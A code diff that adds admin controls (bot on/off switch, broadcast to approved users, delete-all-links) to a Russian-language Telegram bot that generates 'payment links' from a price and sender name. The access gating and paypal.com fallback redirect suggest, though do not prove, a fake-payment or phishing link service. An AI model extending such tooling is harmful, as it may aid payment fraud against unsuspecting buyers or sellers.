@@ -10,6 +10,9 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 // Admin user ID - will be set automatically for the first user who sends /start
 let ADMIN_ID: string | null = null;
 
+// Global bot status
+let BOT_ENABLED = true;
+
 // Initialize ADMIN_ID from database
 async function initializeAdmin() {
   try {
@@ -106,6 +109,19 @@ const mainKeyboard = {
   }
 };
 
+// Admin keyboard for admin users
+const adminKeyboard = {
+  reply_markup: {
+    keyboard: [
+      [{ text: '🔗 Создать ссылку' }, { text: '📋 Мои ссылки' }],
+      [{ text: '⚙️ Управление ботом' }, { text: '📢 Уведомления' }],
+      [{ text: '🗑️ Удалить все ссылки' }, { text: '❓ Помощь' }]
+    ],
+    resize_keyboard: true,
+    one_time_keyboard: false
+  }
+};
+
 // Cancel keyboard
 const cancelKeyboard = {
   reply_markup: {
@@ -150,7 +166,7 @@ bot.onText(/\/start/, async (msg) => {
         `Ваш уникальный ID: ${uniqueId}\n\n` +
         `Вы автоматически получили полный доступ как первый пользователь.\n` +
         `Используйте команду /approve ID для одобрения других пользователей.`, 
-        mainKeyboard
+        adminKeyboard
       );
       return;
     } catch (error) {
@@ -263,6 +279,64 @@ bot.onText(/\/approve (.+)/, async (msg, match) => {
   }
 });
 
+// Admin command to disable bot
+bot.onText(/\/disable_bot/, async (msg) => {
+  const chatId = msg.chat.id;
+  const telegramId = msg.from?.id?.toString() || '';
+  
+  if (!ADMIN_ID || telegramId !== ADMIN_ID) {
+    await bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
+    return;
+  }
+
+  BOT_ENABLED = false;
+  await bot.sendMessage(chatId, 
+    `🚫 Бот отключен для всех пользователей!\n\n` +
+    `Используйте /enable_bot для включения.`,
+    adminKeyboard
+  );
+});
+
+// Admin command to enable bot
+bot.onText(/\/enable_bot/, async (msg) => {
+  const chatId = msg.chat.id;
+  const telegramId = msg.from?.id?.toString() || '';
+  
+  if (!ADMIN_ID || telegramId !== ADMIN_ID) {
+    await bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
+    return;
+  }
+
+  BOT_ENABLED = true;
+  await bot.sendMessage(chatId, 
+    `✅ Бот включен для всех пользователей!`,
+    adminKeyboard
+  );
+});
+
+// Admin command to delete all links
+bot.onText(/\/delete_all_links/, async (msg) => {
+  const chatId = msg.chat.id;
+  const telegramId = msg.from?.id?.toString() || '';
+  
+  if (!ADMIN_ID || telegramId !== ADMIN_ID) {
+    await bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
+    return;
+  }
+
+  try {
+    const result = await db.delete(telegramLinks);
+    await bot.sendMessage(chatId, 
+      `🗑️ Все ссылки удалены!\n\n` +
+      `Теперь все ссылки будут перенаправлять на paypal.com`,
+      adminKeyboard
+    );
+  } catch (error) {
+    console.error('Error deleting all links:', error);
+    await bot.sendMessage(chatId, 'Произошла ошибка при удалении ссылок.');
+  }
+});
+
 // Handle text messages
 bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
@@ -274,6 +348,12 @@ bot.on('message', async (msg) => {
   // Check if user is approved
   if (!(await isUserApproved(telegramId))) {
     await bot.sendMessage(chatId, 'Вы не авторизованы. Используйте /start для запроса доступа.');
+    return;
+  }
+
+  // Check if bot is enabled (except for admin)
+  if (!BOT_ENABLED && telegramId !== ADMIN_ID) {
+    await bot.sendMessage(chatId, '🚫 Бот временно отключен администратором.');
     return;
   }
 
@@ -301,16 +381,61 @@ bot.on('message', async (msg) => {
     return;
   }
 
+  // Admin-only buttons
+  if (telegramId === ADMIN_ID) {
+    if (text === '⚙️ Управление ботом') {
+      const status = BOT_ENABLED ? 'включен ✅' : 'отключен ❌';
+      await bot.sendMessage(chatId, 
+        `🤖 Статус бота: ${status}\n\n` +
+        `Используйте команды:\n` +
+        `/disable_bot - отключить бота для всех пользователей\n` +
+        `/enable_bot - включить бота для всех пользователей`,
+        telegramId === ADMIN_ID ? adminKeyboard : mainKeyboard
+      );
+      return;
+    }
+
+    if (text === '📢 Уведомления') {
+      userStates.set(telegramId, { state: 'awaiting_broadcast_message' });
+      await bot.sendMessage(chatId, 
+        'Введите сообщение для отправки всем пользователям бота:', 
+        cancelKeyboard
+      );
+      return;
+    }
+
+    if (text === '🗑️ Удалить все ссылки') {
+      await bot.sendMessage(chatId, 
+        '⚠️ Вы уверены что хотите удалить ВСЕ ссылки у всех пользователей?\n\n' +
+        'Используйте команду /delete_all_links для подтверждения.',
+        telegramId === ADMIN_ID ? adminKeyboard : mainKeyboard
+      );
+      return;
+    }
+  }
+
   if (text === '❓ Помощь') {
-    await bot.sendMessage(chatId, 
-      `🤖 Помощь по использованию бота:\n\n` +
-      `🔗 Создать ссылку - создание новой платежной ссылки\n` +
-      `📋 Мои ссылки - просмотр и удаление ссылок\n` +
-      `❓ Помощь - это сообщение\n\n` +
-      `Для создания ссылки просто введите цену и имя отправителя.\n` +
-      `Бот автоматически сгенерирует уникальную ссылку для платежа.`,
-      mainKeyboard
-    );
+    const helpText = telegramId === ADMIN_ID 
+      ? `🤖 Помощь по использованию бота:\n\n` +
+        `🔗 Создать ссылку - создание новой платежной ссылки\n` +
+        `📋 Мои ссылки - просмотр и удаление ссылок\n` +
+        `⚙️ Управление ботом - включение/отключение бота\n` +
+        `📢 Уведомления - отправка сообщения всем пользователям\n` +
+        `🗑️ Удалить все ссылки - удаление всех ссылок у всех пользователей\n` +
+        `❓ Помощь - это сообщение\n\n` +
+        `Дополнительные команды:\n` +
+        `/approve #ID - одобрить пользователя\n` +
+        `/disable_bot - отключить бота\n` +
+        `/enable_bot - включить бота\n` +
+        `/delete_all_links - удалить все ссылки`
+      : `🤖 Помощь по использованию бота:\n\n` +
+        `🔗 Создать ссылку - создание новой платежной ссылки\n` +
+        `📋 Мои ссылки - просмотр и удаление ссылок\n` +
+        `❓ Помощь - это сообщение\n\n` +
+        `Для создания ссылки просто введите цену и имя отправителя.\n` +
+        `Бот автоматически сгенерирует уникальную ссылку для платежа.`;
+    
+    await bot.sendMessage(chatId, helpText, telegramId === ADMIN_ID ? adminKeyboard : mainKeyboard);
     return;
   }
 
@@ -321,6 +446,25 @@ bot.on('message', async (msg) => {
     await bot.sendMessage(chatId, 'Используйте кнопки меню для навигации.', mainKeyboard);
   }
 });
+
+// Broadcast message to all approved users
+async function broadcastMessage(message: string) {
+  try {
+    const allApprovedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
+    
+    for (const user of allApprovedUsers) {
+      try {
+        await bot.sendMessage(user.telegramId, 
+          `📢 Сообщение от администратора:\n\n${message}`
+        );
+      } catch (error) {
+        console.error(`Failed to send broadcast to user ${user.uniqueId}:`, error);
+      }
+    }
+  } catch (error) {
+    console.error('Error broadcasting message:', error);
+  }
+}
 
 // Handle user conversation states
 async function handleUserState(chatId: number, telegramId: string, text: string, userState: any) {
@@ -354,6 +498,21 @@ async function handleUserState(chatId: number, telegramId: string, text: string,
 
         const { price: linkPrice } = userState.data;
         await createLink(chatId, telegramId, linkPrice, text.trim());
+        userStates.delete(telegramId);
+        break;
+
+      case 'awaiting_broadcast_message':
+        if (telegramId !== ADMIN_ID) {
+          await bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
+          userStates.delete(telegramId);
+          return;
+        }
+
+        await broadcastMessage(text.trim());
+        await bot.sendMessage(chatId, 
+          `✅ Сообщение отправлено всем пользователям!`,
+          adminKeyboard
+        );
         userStates.delete(telegramId);
         break;
 
